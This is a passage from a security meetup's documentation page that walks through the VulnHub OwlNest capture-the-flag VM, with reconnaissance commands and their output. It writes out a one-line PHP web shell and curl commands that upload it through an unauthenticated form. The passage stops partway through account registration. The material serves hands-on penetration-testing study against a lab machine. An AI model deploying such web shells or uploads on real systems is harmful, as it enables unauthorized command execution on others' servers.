

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.2. OwlNest &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="3.3. De-ICE Level 6" href="de-ice6.html" />
    <link rel="prev" title="3.1. Finding and running challenges" href="VWADP.html" /> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.2. OwlNest</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#setup">3.2.1. Setup</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-the-vm">3.2.1.1. Setting up the VM</a></li>
<li class="toctree-l4"><a class="reference internal" href="#setting-up-your-environment">3.2.1.2. Setting up your environment</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#reconnaisance">3.2.2. Reconnaisance</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-reconnaissance">3.2.2.1. Network reconnaissance</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-22">3.2.2.2. Reconnaissance on port 22</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-31337">3.2.2.3. Reconnaissance on port 31337</a></li>
<li class="toctree-l4"><a class="reference internal" href="#reconnaissance-on-port-80">3.2.2.4. Reconnaissance on port 80</a></li>
<li class="toctree-l4"><a class="reference internal" href="#browsing-port-80">3.2.2.5. Browsing port 80</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#the-exploit">3.2.3. The Exploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#exploit-upload-binary">3.2.3.1. Exploit <code class="file docutils literal notranslate"><span class="pre">upload</span></code> binary</a></li>
<li class="toctree-l4"><a class="reference internal" href="#exploit-port-31337">3.2.3.2. Exploit port 31337</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2"><a class="reference internal" href="natas.html">3.27. Natas</a></li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.2. OwlNest</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/owlnest.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="owlnest">
<span id="id21"></span><h1>3.2. OwlNest<a class="headerlink" href="#owlnest" title="Permalink to this headline">¶</a></h1>
<div class="section" id="setup">
<h2>3.2.1. Setup<a class="headerlink" href="#setup" title="Permalink to this headline">¶</a></h2>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="https://www.vulnhub.com/entry/owlnest-102,102/">Vulnhub OwlNest: 1.0.2</a>. This document owes much to two writeups. First <a class="reference external" href="http://blog.techorganic.com/2014/09/10/owlnest-hacking-challenge/">OwlNest Hacking Challenge</a>:</p>
<blockquote>
<div><blockquote>
<div>This was debuted at ESC 2014 CTF where no one was able to solve it. It took me several days to finish off this beast after getting stuck in a tarpit, but this was a whole lot of fun.</div></blockquote>
<p>And <a class="reference external" href="http://fourfourfourfour.co/2014/10/26/owl-up-in-my-grill/">Owl Up in My Grill</a>:</p>
<blockquote>
<div>I was, however, not expecting it to take me 4 days…</div></blockquote>
</div></blockquote>
<p>The point is that this is a comparatively difficult challenge and our writeup will attempt to fill in enough details to allow stepping through the exercise in a few hours.</p>
<div class="section" id="setting-up-the-vm">
<h3>3.2.1.1. Setting up the VM<a class="headerlink" href="#setting-up-the-vm" title="Permalink to this headline">¶</a></h3>
<p>The VM comes packaged as the ova file <a class="reference external" href="http://download.vulnhub.com/owlnest/OwlNest_v1.0.2.ova">OwlNest_v1.0.2.ova</a> running Debian 7 (Wheezy).</p>
</div>
<div class="section" id="setting-up-your-environment">
<h3>3.2.1.2. Setting up your environment<a class="headerlink" href="#setting-up-your-environment" title="Permalink to this headline">¶</a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
mkdir -p <span class="nv">$PT</span>
<span class="nb">cd</span> <span class="nv">$PT</span>
<span class="c1"># download owlnest_setup.sh</span>
curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/owlnest_setup.sh
<span class="c1"># edit as needed; later the recon will give you TARGET IPs</span>
<span class="nb">source</span> owlnest_setup.sh
</pre></div>
</div>
<p>The source for <code class="file docutils literal notranslate"><span class="pre">owlnest_setup.sh</span></code> (<a class="reference download internal" href="../_downloads/owlnest_setup.sh" download=""><code class="xref download docutils literal notranslate"><span class="pre">owlnest_setup.sh</span></code></a>) should look something like the following.</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Edit these to match your setup</span>
<span class="c1"># *******************************************************</span>
<span class="nv">TARGET</span><span class="o">=</span><span class="m">192</span>.168.1.102          <span class="c1"># ip of owlnest</span>
<span class="nv">SUBNET</span><span class="o">=</span><span class="m">192</span>.168.1.0/24         <span class="c1"># subnet</span>
<span class="nv">KALI</span><span class="o">=</span><span class="m">192</span>.168.1.28             <span class="c1"># Kali IP</span>
<span class="nv">PORT</span><span class="o">=</span><span class="m">4444</span>                     <span class="c1"># reverse shell port</span>
<span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest      <span class="c1"># create working directories here</span>

<span class="k">if</span> <span class="o">[[</span> <span class="k">$(</span>grep -c owlnest /etc/hosts<span class="k">)</span> -eq <span class="m">0</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
  <span class="nb">echo</span> <span class="s2">&quot; add \&quot;</span><span class="nv">$TARGET</span><span class="s2"> owlnest.com\&quot; to /etc/hosts&quot;</span>
<span class="k">fi</span>

<span class="c1"># *******************************************************</span>
<span class="c1"># Maybe edit these</span>
<span class="c1"># *******************************************************</span>
<span class="c1"># Create some directories</span>
<span class="nv">TOOLS</span><span class="o">=</span>exploit,nmap,spider
<span class="nb">eval</span> mkdir -p <span class="nv">$PT</span>/<span class="o">{</span><span class="nv">$TOOLS</span><span class="o">}</span>
<span class="nv">COOKIES</span><span class="o">=</span>cookies.txt
<span class="nv">TARGETS</span><span class="o">=</span>targets.txt

<span class="c1"># *******************************************************</span>
<span class="c1"># Don&#39;t edit these</span>
<span class="c1"># *******************************************************</span>
<span class="nv">HOST</span><span class="o">=</span>owlnest.com
<span class="nv">SUDO</span><span class="o">=</span><span class="k">$(</span>which sudo<span class="k">)</span>
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="reconnaisance">
<h2>3.2.2. Reconnaisance<a class="headerlink" href="#reconnaisance" title="Permalink to this headline">¶</a></h2>
<div class="section" id="network-reconnaissance">
<h3>3.2.2.1. Network reconnaissance<a class="headerlink" href="#network-reconnaissance" title="Permalink to this headline">¶</a></h3>
<p>Start with some standard network reconnaissance looking for the vulnerable host:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -sn -PE -oA nmap_sn <span class="nv">$SUBNET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_sn.*
<span class="c1"># use the grep-able output to get a list of target hosts</span>
grep Up nmap_sn.gnmap <span class="p">|</span> cut -d<span class="s2">&quot; &quot;</span> -f2 &gt; <span class="nv">$TARGETS</span>
<span class="c1"># use the xml output to get an html report</span>
xsltproc nmap_sn.xml -o nmap_sn.html
</pre></div>
</div>
<p>The result is we find the IP for owlnest: $TARGET. Update $PT/owlnest_setup.sh and also edit <code class="file docutils literal notranslate"><span class="pre">/etc/hosts</span></code> to add “owlnest.com” (<code class="docutils literal notranslate"><span class="pre">echo</span> <span class="pre">&quot;$TARGET</span> <span class="pre">owlnest.com&quot;</span> <span class="pre">|</span> <span class="pre">$SUDO</span> <span class="pre">tee</span> <span class="pre">-a</span> <span class="pre">/etc/hosts</span></code>).</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/nmap

<span class="nv">$SUDO</span> nmap -A -vv -T3 --max-retries <span class="m">5</span> -Pn -oA nmap_A <span class="nv">$TARGET</span>
<span class="nv">$SUDO</span> chown <span class="nv">$USER</span>.<span class="nv">$USER</span> nmap_A.*
xsltproc nmap_A.xml -o nmap_A.html
</pre></div>
</div>
<p>Running the above reveals:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="hll"><span class="go">PORT      STATE SERVICE REASON         VERSION</span>
</span><span class="hll"><span class="go">22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)</span>
</span><span class="hll"><span class="go">80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Debian))</span>
</span><span class="go">|_http-methods: No Allow or Public header in OPTIONS response (status code 302)</span>
<span class="hll"><span class="go">|_http-server-header: Apache/2.2.22 (Debian)</span>
</span><span class="hll"><span class="go">| http-title: Site doesn&#39;t have a title (text/html).</span>
</span><span class="go">|_Requested resource was /login_form.php</span>
<span class="hll"><span class="go">111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)</span>
</span><span class="go">| rpcinfo:</span>
<span class="hll"><span class="go">|   program version   port/proto  service</span>
</span><span class="go">|   100000  2,3,4        111/tcp  rpcbind</span>
<span class="go">|   100000  2,3,4        111/udp  rpcbind</span>
<span class="go">|   100024  1          55737/udp  status</span>
<span class="go">|_  100024  1          56935/tcp  status</span>
<span class="hll"><span class="go">31337/tcp open  Elite?  syn-ack ttl 64</span>
</span>
<span class="hll"><span class="go">OS details: Linux 3.2, Linux 3.2 - 3.13</span>
</span></pre></div>
</div>
</div>
<div class="section" id="reconnaissance-on-port-22">
<h3>3.2.2.2. Reconnaissance on port 22<a class="headerlink" href="#reconnaissance-on-port-22" title="Permalink to this headline">¶</a></h3>
<p><code class="docutils literal notranslate"><span class="pre">ssh</span> <span class="pre">root&#64;owlnest.com</span></code> accepted a password attempt so might be used to brute-force discovered user id passwords.</p>
</div>
<div class="section" id="reconnaissance-on-port-31337">
<h3>3.2.2.3. Reconnaissance on port 31337<a class="headerlink" href="#reconnaissance-on-port-31337" title="Permalink to this headline">¶</a></h3>
<p>We try <strong class="program">socat</strong> on port 31337 (“eleet”):</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/owlnest/exploit$</span> socat - TCP:owlnest.com:31337
<span class="go">        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)</span>
<span class="go">        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\</span>
<span class="go">        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/</span>
<span class="go">       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\</span>
<span class="go">       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://</span>
<span class="go">   -----`&quot;&quot; &quot;&quot;`---`&quot;&quot; &quot;&quot;`---`&quot;&quot; &quot;&quot;`---`&quot;&quot; &quot;&quot;`---`&quot;&quot; &quot;&quot;`---`&quot;&quot; &quot;&quot;`---</span>
<span class="go">        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/</span>

<span class="go">This is the OwlNest Administration console</span>

<span class="go">Type Help for a list of available commands.</span>

<span class="go">Ready: help</span>

<span class="go">Syntax: command &lt;argument&gt;</span>

<span class="go">help     This help</span>
<span class="go">username   Specify your login name</span>
<span class="go">password   Specify your password</span>
<span class="go">privs   Specify your access level</span>
<span class="go">login     login to shell with specified username and password</span>
</pre></div>
</div>
<p>We lack a user id and password to pursue this now, but undoubtedly it will surface again later.</p>
</div>
<div class="section" id="reconnaissance-on-port-80">
<h3>3.2.2.4. Reconnaissance on port 80<a class="headerlink" href="#reconnaissance-on-port-80" title="Permalink to this headline">¶</a></h3>
<p>Standard HTTP reconnaissance:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/spider

<span class="hll">dirb  http://<span class="nv">$HOST</span>/ -o dirb80_<span class="nv">$HOST</span>.txt
</span><span class="hll">nikto -output nikto.html -C all -host <span class="nv">$HOST</span> -port <span class="m">80</span>
</span></pre></div>
</div>
<p>Significant findings were:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">---- Scanning URL: http://owlnest.com/ ----</span>
<span class="hll"><span class="go">==&gt; DIRECTORY: http://owlnest.com/application/</span>
</span><span class="go">==&gt; DIRECTORY: http://owlnest.com/css/</span>
<span class="go">==&gt; DIRECTORY: http://owlnest.com/errors/</span>
<span class="go">==&gt; DIRECTORY: http://owlnest.com/fonts/</span>
<span class="hll"><span class="go">==&gt; DIRECTORY: http://owlnest.com/forms/</span>
</span><span class="go">==&gt; DIRECTORY: http://owlnest.com/graphics/</span>
<span class="hll"><span class="go">==&gt; DIRECTORY: http://owlnest.com/images/</span>
</span><span class="hll"><span class="go">==&gt; DIRECTORY: http://owlnest.com/includes/</span>
</span><span class="go">+ http://owlnest.com/index.php (CODE:302|SIZE:1750)</span>
<span class="go">==&gt; DIRECTORY: http://owlnest.com/js/</span>
<span class="go">==&gt; DIRECTORY: http://owlnest.com/pictures/</span>
<span class="go">+ http://owlnest.com/server-status (CODE:403|SIZE:292)</span>
<span class="hll"><span class="go">+ http://owlnest.com/application/upload (CODE:200|SIZE:190)</span>
</span>
<span class="hll"><span class="go">+ Root page / redirects to: /login_form.php</span>
</span></pre></div>
</div>
</div>
<div class="section" id="browsing-port-80">
<h3>3.2.2.5. Browsing port 80<a class="headerlink" href="#browsing-port-80" title="Permalink to this headline">¶</a></h3>
<div class="section" id="reconnaissance-without-a-user-id">
<h4>3.2.2.5.1. Reconnaissance without a user id<a class="headerlink" href="#reconnaissance-without-a-user-id" title="Permalink to this headline">¶</a></h4>
<p>Visiting <a class="reference external" href="http://owlnest.com/">http://owlnest.com/</a> redirects to <a class="reference external" href="http://owlnest.com/login_form.php">Welcome to the OwlNest</a>. But that need not stop you from doing lots of reconnaissance; there all the <strong class="program">dirb</strong>-found directories could be browsed, outside <a class="reference external" href="http://owlnest.com/">http://owlnest.com/</a> which redirected to the <a class="reference external" href="http://owlnest.com/login_form.php">Welcome to the OwlNest</a> login/registration page.</p>
<div class="section" id="uploading-files-without-a-user-id">
<h5>3.2.2.5.1.1. Uploading files without a user id<a class="headerlink" href="#uploading-files-without-a-user-id" title="Permalink to this headline">¶</a></h5>
<p>Selecting <a class="reference external" href="http://owlnest.com/forms/form.php">http://owlnest.com/forms/form.php</a> brings ups an upload form showing the web server root directory is <code class="file docutils literal notranslate"><span class="pre">/var/www/</span></code>. If you actually fill out the form you can upload arbitrary files and a little investigation finds them at <a class="reference external" href="http://owlnest.com/images/">http://owlnest.com/images/</a>, however you don’t have permissions to fetch them:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
<span class="nb">cd</span> <span class="nv">$PT</span>/exploit

<span class="hll"><span class="c1"># Create PHP to execute arbitrary shell commands</span>
</span><span class="hll"><span class="nb">echo</span> <span class="s1">&#39;&lt;?php passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span> &gt; x.php
</span><span class="hll">cp x.php x.php.jpg
</span>
<span class="hll"><span class="c1"># Upload without credentials</span>
</span><span class="hll"><span class="nv">URL</span><span class="o">=</span><span class="s1">&#39;http://owlnest.com/application/upload&#39;</span>
</span><span class="nv">NAME</span><span class="o">=</span><span class="s1">&#39;Exploit&#39;</span>
<span class="nv">EMAIL</span><span class="o">=</span><span class="s1">&#39;pentest-meetup@bitbender.org&#39;</span>
<span class="nv">DESCRIPTION</span><span class="o">=</span><span class="s1">&#39;Sample Upload&#39;</span>

<span class="hll"><span class="c1"># First upload x.php</span>
</span><span class="hll"><span class="nv">UPLOADFIELD</span><span class="o">=</span><span class="s1">&#39;@x.php&#39;</span>
</span>curl --silent <span class="se">\</span>
  --form <span class="s2">&quot;name=</span><span class="nv">$NAME</span><span class="s2">&quot;</span>  <span class="se">\</span>
  --form <span class="s2">&quot;email=</span><span class="nv">$EMAIL</span><span class="s2">&quot;</span> <span class="se">\</span>
  --form <span class="s2">&quot;description=</span><span class="nv">$DESCRIPTION</span><span class="s2">&quot;</span> <span class="se">\</span>
  --form <span class="s2">&quot;uploadfield=</span><span class="nv">$UPLOADFIELD</span><span class="s2">&quot;</span> <span class="se">\</span>
  <span class="nv">$URL</span>

<span class="hll"><span class="c1"># Then upload x.php.jpg</span>
</span><span class="hll"><span class="nv">UPLOADFIELD</span><span class="o">=</span><span class="s1">&#39;@x.php.jpg&#39;</span>
</span>curl --silent <span class="se">\</span>
  --form <span class="s2">&quot;name=</span><span class="nv">$NAME</span><span class="s2">&quot;</span>  <span class="se">\</span>
  --form <span class="s2">&quot;email=</span><span class="nv">$EMAIL</span><span class="s2">&quot;</span> <span class="se">\</span>
  --form <span class="s2">&quot;description=</span><span class="nv">$DESCRIPTION</span><span class="s2">&quot;</span> <span class="se">\</span>
  --form <span class="s2">&quot;uploadfield=</span><span class="nv">$UPLOADFIELD</span><span class="s2">&quot;</span> <span class="se">\</span>
  <span class="nv">$URL</span>

<span class="hll"><span class="c1"># See that they are uploaded</span>
</span>curl --silent http://owlnest.com/images/ <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;x.php&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/.*&gt;x.php/x.php/;s/&lt;.*//&#39;</span>

<span class="hll"><span class="c1"># But you can&#39;t fetch them</span>
</span>curl --silent http://owlnest.com/images/x.php
<span class="c1"># results in</span>
<span class="hll"><span class="c1"># Unknown: failed to open stream: Permission denied</span>
</span>curl --silent http://owlnest.com/images/x.php.jpg
<span class="c1"># results in</span>
<span class="hll"><span class="c1"># 403 Forbidden</span>
</span></pre></div>
</div>
<p>Note that <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">--form</span> <span class="pre">...</span></code> hides all that message file upload POST_DATA creation. Here is what the actual POST_DATA looks like (courtesy of <a class="reference external" href="https://addons.mozilla.org/en-us/firefox/addon/tamper-data/">Tamper Data</a> and an editor showing “\r\n”):</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>&#39;POST_DATA=-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name=&quot;name&quot;\r\n\r\nname\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name=&quot;email&quot;\r\n\r\nemail@email.com\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name=&quot;description&quot;\r\n\r\ndescription\r\n-----------------------------1600898376930139461407304265\r\nContent-Disposition: form-data; name=&quot;uploadfield&quot;; filename=&quot;x.php&quot;\r\nContent-Type: application/x-php\r\n\r\n&lt;?php passthru($_GET[&quot;cmd&quot;]); ?&gt;\n\r\n-----------------------------1600898376930139461407304265--\r\n&#39;
</pre></div>
</div>
<p>To see the POST_DATA using curl, use <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">--trace-ascii</span> <span class="pre">/dev/stdout</span> <span class="pre">...</span></code> or (if you want to see the “\r\n” line endings) <code class="docutils literal notranslate"><span class="pre">curl</span> <span class="pre">--trace</span> <span class="pre">/dev/stdout</span> <span class="pre">...</span></code>), both without the <code class="docutils literal notranslate"><span class="pre">-v</span></code> option (which will override the trace option).</p>
<p><code class="file docutils literal notranslate"><span class="pre">application/upload</span></code> looks interesting but currently inaccessible:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="hll">curl http://owlnest.com/application/upload
</span><span class="c1"># results in</span>
<span class="c1">#  / ___  ___ \</span>
<span class="c1"># / / @ \/ @ \ \</span>
<span class="c1"># \ \___/\___/ /\</span>
<span class="c1">#  \____\/____/||</span>
<span class="c1">#  /     /\\\\\//</span>
<span class="c1">#  |     |\\\\\\</span>
<span class="c1">#   \      \\\\\\</span>
<span class="c1">#    \______/\\\\</span>
<span class="c1">#     _||_||_</span>
<span class="c1">#      -- --</span>
<span class="hll"><span class="c1"># you gotta be kidding me, right?</span>
</span></pre></div>
</div>
<p>Now there’s something to remember for later.</p>
</div>
</div>
<div class="section" id="registering-a-new-user-id">
<h4>3.2.2.5.2. Registering a new user id<a class="headerlink" href="#registering-a-new-user-id" title="Permalink to this headline">¶</a></h4>
<p>It’s time to register a user id to see if more reconnaissance is possible. Visit <a class="reference external" href="http://owlnest.com/login_form.php">http://owlnest.com/login_form.php</a> and then click on <a class="reference external" href="http://owlnest.com/register_form.php">Register a new account</a> to get <a class="reference external" href="http://owlnest.com/register_form.php">Owlnest Registration</a>. This is where the curious will not pass by something that is significant for later exploitation - the limits on the input fields. One limit is that the <span class="guilabel">Login Name:</span> is at most 16 characters:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-group&quot;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;nome&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;col-sm-2 col-lg-2 control-label&quot;</span><span class="p">&gt;</span>Login Name:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;col-sm-5 col-lg-5&quot;</span><span class="p">&gt;</span>
<span class="hll">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-control&quot;</span> <span class="na">maxlength</span><span class="o">=</span><span class="s">&quot;16&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Choose a Login name...&quot;</span><span class="p">&gt;</span>
</span>  <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>This will be very important later, when we discover that we desperately need to run as user “admin”. But for now we just note that limitation.</p>
<p>Here’s the <strong class="program">curl</strong> equivalent to register a new account. This first one will fail as “admin” already exists:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PT</span><span class="o">=</span><span class="nv">$HOME</span>/pentest/owlnest
<span class="nb">source</span> <span class="nv">$PT</span>/owlnest_setup.sh
